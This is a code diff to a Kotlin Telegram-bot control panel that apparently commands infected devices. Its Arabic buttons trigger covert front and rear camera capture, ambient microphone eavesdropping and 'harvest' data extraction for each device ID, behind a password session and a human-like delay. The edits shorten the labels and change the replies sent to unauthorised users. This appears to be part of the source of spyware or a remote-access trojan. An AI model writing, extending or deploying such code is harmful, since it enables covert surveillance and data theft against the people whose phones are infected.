@@ -584,12 +584,12 @@ class TelegramUi(
      */
     private fun getDeviceKeyboard(deviceId: String): JSONObject {
         val count = countPendingHarvest()
-        val harvestText = if (count > 0) "📦 استخراج البيانات ($count)" else "📦 استخراج البيانات"
+        val harvestText = if (count > 0) "📦 استخراج ($count)" else "📦 استخراج"
         return JSONObject().apply {
             put("inline_keyboard", JSONArray().apply {
                 put(JSONArray().apply {
-                    put(JSONObject().apply { put("text", "🔭 اقتناص بصري (خلفي)"); put("callback_data", "cam_$deviceId") })
-                    put(JSONObject().apply { put("text", "🕵️ اقتناص بصري (أمامي)"); put("callback_data", "camf_$deviceId") })
+                    put(JSONObject().apply { put("text", "🔭 اقتناص خلفي"); put("callback_data", "cam_$deviceId") })
+                    put(JSONObject().apply { put("text", "🕵️ اقتناص أمامي"); put("callback_data", "camf_$deviceId") })
                 })
                 put(JSONArray().apply {
                     put(JSONObject().apply { put("text", "🎤 تنصت محيطي"); put("callback_data", "mic_$deviceId") })
@@ -600,12 +600,12 @@ class TelegramUi(
                     put(JSONObject().apply { put("text", "⚡ بث فوري"); put("callback_data", "send_now_$deviceId") })
                 })
                 put(JSONArray().apply {
-                    put(JSONObject().apply { put("text", "🌐 تحديث الشبكات"); put("callback_data", "update_model_$deviceId") })
-                    put(JSONObject().apply { put("text", "♻️ إعادة تشغيل الخدمة"); put("callback_data", "restart_service_$deviceId") })
+                    put(JSONObject().apply { put("text", "🌐 تحديث النموذج"); put("callback_data", "update_model_$deviceId") })
+                    put(JSONObject().apply { put("text", "♻️ إعادة تشغيل"); put("callback_data", "restart_service_$deviceId") })
                 })
                 put(JSONArray().apply {
-                    put(JSONObject().apply { put("text", "🔙 العودة للقيادة"); put("callback_data", "ld") })
-                    put(JSONObject().apply { put("text", "🔒 قفل التحكم"); put("callback_data", "ext") })
+                    put(JSONObject().apply { put("text", "🔙 العودة"); put("callback_data", "ld") })
+                    put(JSONObject().apply { put("text", "🔐 قفل"); put("callback_data", "ext") })
                 })
             })
         }
@@ -658,25 +658,24 @@ class TelegramUi(
         try {
             val msg = update.optJSONObject("message") ?: return
             val chatId = msg.optJSONObject("chat")?.optLong("id") ?: return
-            val text = msg.optString("text", "")
+            val text = msg.optString("text", "").trim()
             val threadId = msg.optLong("message_thread_id", 0L)
 
             applyHumanDelay()
 
+            // ✅ التحقق من كلمة السر (الأمر النصي الوحيد المقبول)
             val isLoginCommand = text.startsWith("/login")
             val secret = when {
                 isLoginCommand -> text.split("\\s+".toRegex()).getOrNull(1)?.trim() ?: ""
-                else -> text.trim()
+                else -> text
             }
 
-            // ✅ كلمة السر هي الأمر النصي الوحيد المقبول
             if (secret.isNotEmpty() && verifyControlPassword(secret)) {
                 sessionMutex.withLock {
                     sessions[chatId.toString()] = (System.currentTimeMillis() / 1000) + 14400
                 }
                 saveData()
 
-                // ✅ استخدام لوحة المفاتيح الجديدة (كل إيموجي فريد)
                 val keyboardJson = getMainControlKeyboard()
                 apiCall("sendMessage", JSONObject().apply {
                     put("chat_id", chatId)
@@ -697,22 +696,20 @@ class TelegramUi(
                 return
             }
 
-            // ✅ أي نص آخر (ليس كلمة سر) يتم تجاهله
+            // ✅ أي نص آخر يتم تجاهله (حتى لو كانت الجلسة مصرحاً بها)
             if (!isAuthorized(chatId)) {
                 apiCall("sendMessage", JSONObject().apply {
                     put("chat_id", chatId)
                     if (threadId != 0L) put("message_thread_id", threadId)
                     put("text", "🔐 الرجاء إدخال كلمة السر للتحكم")
                 })
-                return
+            } else {
+                apiCall("sendMessage", JSONObject().apply {
+                    put("chat_id", chatId)
+                    if (threadId != 0L) put("message_thread_id", threadId)
+                    put("text", "⚠️ الأوامر النصية معطلة. استخدم الأزرار فقط.")
+                })
             }
-
-            // إذا كان مصرحاً وأرسل نصاً عادياً، نعرض رسالة وهمية
-            apiCall("sendMessage", JSONObject().apply {
-                put("chat_id", chatId)
-                if (threadId != 0L) put("message_thread_id", threadId)
-                put("text", "⚠️ Unknown system command. Use the buttons to interact.")
-            })
 
         } catch (e: Exception) {
             writeLog("Handle message error: ${e.message}")
